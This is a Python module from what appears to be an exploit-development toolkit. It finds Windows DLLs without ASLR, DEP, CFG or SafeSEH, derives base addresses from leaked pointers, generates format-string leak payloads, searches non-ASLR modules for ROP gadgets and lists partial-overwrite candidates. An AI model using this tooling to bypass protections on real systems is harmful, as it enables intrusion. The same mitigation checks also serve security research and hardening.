# -*- coding: utf-8 -*-
"""
luodllhack/exploit/bypass/aslr.py - ASLR 绕过模块

提供 ASLR (Address Space Layout Randomization) 绕过技术。

绕过策略:
1. 查找未启用 ASLR 的模块
2. 信息泄露利用
3. 部分覆盖技术
4. 暴力破解 (Windows 32-bit 特定场景)

使用示例:
    bypass = ASLRBypass()

    # 查找非 ASLR 模块
    modules = bypass.find_non_aslr_modules(['module1.dll', 'module2.dll'])

    # 从泄露地址计算基址
    base = bypass.calculate_base_from_leak(leaked_addr, known_offset)
"""

import struct
from dataclasses import dataclass, field
from typing import List, Dict, Optional
from pathlib import Path
import logging

logger = logging.getLogger(__name__)

# 可选依赖
try:
    import pefile
    HAVE_PEFILE = True
except ImportError:
    HAVE_PEFILE = False


@dataclass
class ModuleInfo:
    """模块信息"""
    path: str
    name: str
    base_address: int
    size: int
    has_aslr: bool
    has_dep: bool
    has_cfg: bool  # Control Flow Guard
    has_seh: bool  # SafeSEH
    is_rebase_stripped: bool
    characteristics: int


@dataclass
class LeakResult:
    """泄露结果"""
    leaked_value: int
    calculated_base: int
    module_name: str
    confidence: float


class ASLRBypass:
    """
    ASLR 绕过策略

    ASLR 使模块加载地址随机化，但存在以下绕过方法:
    1. 使用未启用 ASLR 的模块 (老旧 DLL)
    2. 信息泄露获取实际地址
    3. 部分覆盖 (只覆盖低位字节)
    4. 堆喷射 (大量分配使地址可预测)
    """

    # DllCharacteristics 标志
    IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE = 0x0040  # ASLR
    IMAGE_DLLCHARACTERISTICS_NX_COMPAT = 0x0100     # DEP
    IMAGE_DLLCHARACTERISTICS_NO_SEH = 0x0400        # 无 SEH
    IMAGE_DLLCHARACTERISTICS_GUARD_CF = 0x4000      # CFG

    def __init__(self):
        if not HAVE_PEFILE:
            logger.warning("pefile not available. Some features may not work.")

    def find_non_aslr_modules(self, module_paths: List[str]) -> List[ModuleInfo]:
        """
        查找未启用 ASLR 的模块

        Args:
            module_paths: 模块路径列表

        Returns:
            未启用 ASLR 的模块列表
        """
        if not HAVE_PEFILE:
            logger.error("pefile is required for this function")
            return []

        non_aslr = []

        for path in module_paths:
            try:
                info = self.analyze_module(path)
                if info and not info.has_aslr:
                    non_aslr.append(info)
            except Exception as e:
                logger.warning(f"Failed to analyze {path}: {e}")

        # 按基址排序
        non_aslr.sort(key=lambda m: m.base_address)

        return non_aslr

    def analyze_module(self, module_path: str) -> Optional[ModuleInfo]:
        """
        分析模块的保护特性

        Args:
            module_path: 模块路径

        Returns:
            ModuleInfo 或 None
        """
        if not HAVE_PEFILE:
            return None

        try:
            pe = pefile.PE(module_path)

            dll_chars = pe.OPTIONAL_HEADER.DllCharacteristics
            file_chars = pe.FILE_HEADER.Characteristics

            # 检查各种保护
            has_aslr = bool(dll_chars & self.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)
            has_dep = bool(dll_chars & self.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
            has_cfg = bool(dll_chars & self.IMAGE_DLLCHARACTERISTICS_GUARD_CF)
            no_seh = bool(dll_chars & self.IMAGE_DLLCHARACTERISTICS_NO_SEH)

            # 检查重定位表是否被剥离
            is_rebase_stripped = bool(file_chars & 0x0001)  # IMAGE_FILE_RELOCS_STRIPPED

            return ModuleInfo(
                path=module_path,
                name=Path(module_path).name,
                base_address=pe.OPTIONAL_HEADER.ImageBase,
                size=pe.OPTIONAL_HEADER.SizeOfImage,
                has_aslr=has_aslr,
                has_dep=has_dep,
                has_cfg=has_cfg,
                has_seh=not no_seh,
                is_rebase_stripped=is_rebase_stripped,
                characteristics=dll_chars
            )

        except Exception as e:
            logger.error(f"Failed to analyze {module_path}: {e}")
            return None

    def calculate_base_from_leak(self,
                                  leaked_addr: int,
                                  known_offset: int) -> int:
        """
        从泄露的地址计算模块基址

        Args:
            leaked_addr: 泄露的地址
            known_offset: 该地址相对于基址的已知偏移

        Returns:
            计算出的基址
        """
        return leaked_addr - known_offset

    def generate_format_string_leak(self, offset: int, count: int = 1) -> bytes:
        """
        生成格式化字符串泄露 payload

        Args:
            offset: 栈偏移
            count: 要泄露的地址数量

        Returns:
            格式化字符串 payload
        """
        payloads = []
        for i in range(count):
            payloads.append(f'%{offset + i}$p')

        return '.'.join(payloads).encode()

    def analyze_leaked_addresses(self,
                                  addresses: List[int],
                                  module_infos: List[ModuleInfo]) -> List[LeakResult]:
        """
        分析泄露的地址，尝试识别属于哪个模块

        Args:
            addresses: 泄露的地址列表
            module_infos: 模块信息列表

        Returns:
            LeakResult 列表
        """
        results = []

        for addr in addresses:
            for module in module_infos:
                # 检查地址是否在模块范围内
                if module.base_address <= addr < module.base_address + module.size:
                    offset = addr - module.base_address
                    results.append(LeakResult(
                        leaked_value=addr,
                        calculated_base=module.base_address,
                        module_name=module.name,
                        confidence=0.9  # 高置信度
                    ))
                    break

        return results

    def find_gadgets_in_non_aslr(self,
                                  module_paths: List[str],
                                  gadget_type: str = 'jmp-esp') -> Dict[str, List]:
        """
        在非 ASLR 模块中查找 gadgets

        Args:
            module_paths: 模块路径列表
            gadget_type: gadget 类型

        Returns:
            模块名到 gadget 列表的映射
        """
        from ..rop.finder import ROPGadgetFinder

        result = {}
        non_aslr = self.find_non_aslr_modules(module_paths)

        for module in non_aslr:
            try:
                finder = ROPGadgetFinder()
                gadgets = finder.find_by_type(module.path, gadget_type)
                if gadgets:
                    result[module.name] = gadgets
            except Exception as e:
                logger.warning(f"Failed to find gadgets in {module.name}: {e}")

        return result

    def partial_overwrite_candidates(self,
                                      target_addr: int,
                                      partial_bytes: int = 2) -> List[int]:
        """
        生成部分覆盖候选地址

        当只能覆盖低位字节时使用

        Args:
            target_addr: 目标地址
            partial_bytes: 可覆盖的字节数

        Returns:
            可能的目标地址列表
        """
        mask = (1 << (partial_bytes * 8)) - 1
        base = target_addr & ~mask

        candidates = []
        for i in range(1 << (partial_bytes * 8)):
            candidates.append(base | i)

        return candidates

    def print_module_info(self, module: ModuleInfo) -> None:
        """打印模块信息"""
        print(f"\n{module.name}")
        print(f"  Path: {module.path}")
        print(f"  Base: 0x{module.base_address:08x}")
        print(f"  Size: 0x{module.size:x}")
        print(f"  ASLR: {'Yes' if module.has_aslr else 'No'}")
        print(f"  DEP:  {'Yes' if module.has_dep else 'No'}")
        print(f"  CFG:  {'Yes' if module.has_cfg else 'No'}")
        print(f"  SEH:  {'Yes' if module.has_seh else 'No'}")

    def report(self, modules: List[ModuleInfo]) -> str:
        """
        生成分析报告

        Args:
            modules: 模块信息列表

        Returns:
            报告字符串
        """
        lines = ["ASLR Bypass Analysis Report", "=" * 40]

        # 分类模块
        no_aslr = [m for m in modules if not m.has_aslr]
        no_dep = [m for m in modules if not m.has_dep]
        no_cfg = [m for m in modules if not m.has_cfg]

        lines.append(f"\nTotal modules analyzed: {len(modules)}")
        lines.append(f"Modules without ASLR: {len(no_aslr)}")
        lines.append(f"Modules without DEP: {len(no_dep)}")
        lines.append(f"Modules without CFG: {len(no_cfg)}")

        if no_aslr:
            lines.append("\n\nModules without ASLR (best targets):")
            lines.append("-" * 40)
            for m in no_aslr:
                lines.append(f"  {m.name}: 0x{m.base_address:08x} ({m.size // 1024} KB)")

        return '\n'.join(lines)
